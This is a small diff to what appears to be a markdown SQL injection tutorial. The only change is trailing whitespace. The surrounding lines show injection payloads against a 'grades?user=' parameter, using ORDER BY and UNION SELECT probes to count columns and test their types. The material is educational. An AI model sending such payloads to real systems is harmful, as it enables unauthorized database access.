@@ -34,7 +34,7 @@ If the page load is properly loaded, there is a high risk for a SQL vulnerabilit
 *.../grades?user=admin' ORDER BY 6 --'*   **# Fails! We only have 5 columns**  
 
 We can then query the type of each column by selecting values that we think are matching types  
-*.../grades?user=admin' UNION SELECT null, null, null, null, null --'*   **# Start with only null, change one at a time**
+*.../grades?user=admin' UNION SELECT null, null, null, null, null --'*   **# Start with only null, change one at a time**  
 *.../grades?user=admin' UNION SELECT 1, null, 3, 'TEST', 'ABC' --'*      **# Change data types as long as server does not crash**
 
 #### Questions
